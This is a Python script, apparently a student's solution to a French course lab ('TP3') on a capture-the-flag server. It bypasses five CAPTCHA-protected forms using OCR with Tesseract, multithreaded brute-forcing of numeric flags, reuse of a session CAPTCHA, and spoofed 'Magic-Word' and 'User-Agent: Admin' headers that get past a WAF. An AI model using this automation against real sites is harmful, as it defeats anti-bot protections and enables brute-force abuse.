"""TP3 - Bypass CAPTCHA automatisé - Nagib Lakhdari"""

from PIL import Image
from concurrent.futures import ThreadPoolExecutor, as_completed
import pytesseract, io, re, threading, requests

# Config Tesseract (à adapter selon l'installation => Déso pour les linuxiens)
pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'

BASE_URL = "http://31.220.95.27:9002"

# Pour stopper les threads quand on trouve le flag
stop_flag = threading.Event()
result_lock = threading.Lock()
found_data = {"flag": None, "text": None}


def read_captcha(session):
    """Recup l'image captcha et la lit avec OCR"""

    resp = session.get(f"{BASE_URL}/captcha.php")
    img = Image.open(io.BytesIO(resp.content))
    text = pytesseract.image_to_string(img, config='--psm 7 -c tessedit_char_whitelist=0123456789').strip()
    return text


def extract_flag(html):
    """Cherche le flag dans la reponse HTML"""

    # Format normal: FLAG-1{...}
    match = re.search(r'FLAG-\d+\{[^}]+\}', html)
    if match: return match.group()
    # Format avec espaces varies: F L A G, F L AG, FL AG, etc.
    match = re.search(r'F\s*L\s*A\s*G\s*-\s*(\d+)\s*\{\s*([^}]+)\}', html)
    if match: return f"FLAG-{match.group(1)}{{{match.group(2).strip()}}}"
    return None


# ============ CAPTCHA 1 ============
# Le captcha change à chaque requete donc on doit en lire un nouveau à chaque fois
# Du coup on multithread pour aller plus vite

def try_single_flag(challenge, flag_val):
    """Test un flag (utilisé par les threads)"""

    if stop_flag.is_set(): return None

    try:
        sess = requests.Session()
        sess.get(f"{BASE_URL}/{challenge}/")
        captcha = read_captcha(sess)

        resp = sess.post(f"{BASE_URL}/{challenge}/", data={
            'flag': str(flag_val),
            'captcha': captcha,
            'submit': ''
        })

        if "Correct" in resp.text or "Congrat" in resp.text:
            with result_lock:
                stop_flag.set()
                found_data["flag"] = flag_val
                found_data["text"] = extract_flag(resp.text)
            return flag_val
    except:
        pass
    return None


def solve_captcha1():
    """Captcha1 - flag entre 1000 et 2000, multithread"""

    global found_data
    stop_flag.clear()
    found_data = {"flag": None, "text": None}

    print("\n[CAPTCHA1] Bruteforce 1000-2000 (10 threads)")

    with ThreadPoolExecutor(max_workers=10) as pool:
        futures = {pool.submit(try_single_flag, "captcha1", f): f for f in range(1000, 2001)}

        done = 0
        for _ in as_completed(futures):
            done += 1
            if done % 100 == 0:
                print(f"  -> {done}/1001")

            if stop_flag.is_set():
                pool.shutdown(wait=False, cancel_futures=True)
                break

    if found_data["flag"]:
        print(f"[+] Flag trouvé: {found_data['flag']}")
        if found_data["text"]: print(f"[+] {found_data['text']}")
    else: print("[-] Rien trouvé")


# ============ CAPTCHA 2 ============
# Comme captcha1 mais le message de succes est different ("Wonderful")
# Le flag est affiché avec des espaces: F L A G - 2 {...}

def try_captcha2_flag(flag_val):
    """Test un flag pour captcha2"""

    if stop_flag.is_set(): return None

    try:
        sess = requests.Session()
        sess.get(f"{BASE_URL}/captcha2/")
        captcha = read_captcha(sess)

        resp = sess.post(f"{BASE_URL}/captcha2/", data={
            'flag': str(flag_val),
            'captcha': captcha,
            'submit': ''
        })

        # Captcha2 utilise "Wonderful" comme message de succes
        if "Wonderful" in resp.text or len(resp.text) > 1250:
            with result_lock:
                stop_flag.set()
                found_data["flag"] = flag_val
                found_data["text"] = extract_flag(resp.text)
            return flag_val
    except:
        pass
    return None


def solve_captcha2():
    """Captcha2 - flag entre 2000 et 3000, multithread"""

    global found_data
    stop_flag.clear()
    found_data = {"flag": None, "text": None}

    print("\n[CAPTCHA2] Bruteforce 2000-3000 (15 threads)")

    with ThreadPoolExecutor(max_workers=15) as pool:
        futures = {pool.submit(try_captcha2_flag, f): f for f in range(2000, 3001)}

        done = 0
        for _ in as_completed(futures):
            done += 1
            if done % 100 == 0: print(f"  -> {done}/1001")

            if stop_flag.is_set():
                pool.shutdown(wait=False, cancel_futures=True)
                break

    if found_data["flag"]:
        print(f"[+] Flag trouvé: {found_data['flag']}")
        if found_data["text"]: print(f"[+] {found_data['text']}")
    else: print("[-] Rien trouvé")


# ============ CAPTCHA 3 ============
# Ici le captcha reste valide pour toute la session
# Donc on le lit une fois et on spam les requetes

def solve_captcha3():
    """Captcha3 - flag entre 3000 et 4000, captcha réutilisable"""

    print("\n[CAPTCHA3] Bruteforce 3000-4000 (captcha réutilisé)")

    sess = requests.Session()
    sess.get(f"{BASE_URL}/captcha3/")
    captcha = read_captcha(sess)
    print(f"  Captcha: {captcha}")

    for flag in range(3000, 4001):
        resp = sess.post(f"{BASE_URL}/captcha3/", data={
            'flag': str(flag),
            'captcha': captcha,
            'submit': ''
        })

        if "Correct" in resp.text or "Congrat" in resp.text:
            print(f"[+] Flag trouvé: {flag}")
            flag_text = extract_flag(resp.text)
            if flag_text: print(f"[+] {flag_text}")
            return

        if flag % 200 == 0: print(f"  -> {flag}")

    print("[-] Rien trouvé")


# ============ CAPTCHA 4 ============
# Pas de captcha, juste un header "Magic-Word" requis
# N'importe quelle valeur pour Magic-Word fonctionne

def solve_captcha4():
    """Captcha4 - flag entre 7000 et 8000, header Magic-Word requis"""

    print("\n[CAPTCHA4] Bruteforce 7000-8000 (header Magic-Word)")

    headers = {'Magic-Word': 'please'}

    for flag in range(7000, 8001):
        resp = requests.post(f"{BASE_URL}/captcha4/", headers=headers, data={
            'flag': str(flag),
            'submit': ''
        })

        if "Correct" in resp.text:
            print(f"[+] Flag trouvé: {flag}")
            print("[+] (Ce challenge n'affiche pas de flag textuel)")
            return

        if flag % 200 == 0: print(f"  -> {flag}")

    print("[-] Rien trouvé")


# ============ CAPTCHA 5 ============
# Requiert Magic-Word: admin ET User-Agent: Admin
# Le WAF ajoute un captcha apres le premier POST
# Le flag est cache dans le message "Incorrect flag" quand on trouve le bon

def try_captcha5_flag(flag_val):
    """Test un flag pour captcha5"""

    if stop_flag.is_set(): return None

    try:
        headers = {'Magic-Word': 'admin', 'User-Agent': 'Admin'}
        sess = requests.Session()

        # Init session
        sess.get(f"{BASE_URL}/captcha5/", headers=headers)

        # Trigger captcha
        sess.post(f"{BASE_URL}/captcha5/", headers=headers, data={'flag': '0', 'submit': ''})

        # Lire captcha
        captcha = read_captcha(sess)

        # POST final
        resp = sess.post(f"{BASE_URL}/captcha5/", headers=headers, data={
            'flag': str(flag_val),
            'captcha': captcha,
            'submit': ''
        })

        # Le WAF cache le flag dans le message d'erreur (len > 1350)
        if len(resp.text) > 1350:
            with result_lock:
                stop_flag.set()
                found_data["flag"] = flag_val
                found_data["text"] = extract_flag(resp.text)
            return flag_val
    except:
        pass
    return None


def solve_captcha5():
    """Captcha5 - flag entre 8000 et 9000, headers + WAF sneaky"""

    global found_data
    stop_flag.clear()
    found_data = {"flag": None, "text": None}

    print("\n[CAPTCHA5] Bruteforce 8000-9000 (WAF + captcha)")

    with ThreadPoolExecutor(max_workers=15) as pool:
        futures = {pool.submit(try_captcha5_flag, f): f for f in range(8000, 9001)}

        done = 0
        for _ in as_completed(futures):
            done += 1
            if done % 100 == 0: print(f"  -> {done}/1001")

            if stop_flag.is_set():
                pool.shutdown(wait=False, cancel_futures=True)
                break

    if found_data["flag"]:
        print(f"[+] Flag trouvé: {found_data['flag']}")
        if found_data["text"]: print(f"[+] {found_data['text']}")
    else: print("[-] Rien trouvé")

def main():
    """Point d'entree principal"""
    print("=" * 40)
    print("TP3 - CAPTCHA Bypass")
    print("=" * 40)

    solve_captcha1()
    solve_captcha2()
    solve_captcha3()
    solve_captcha4()
    solve_captcha5()

    print("\nDone!")


if __name__ == "__main__":
    main()
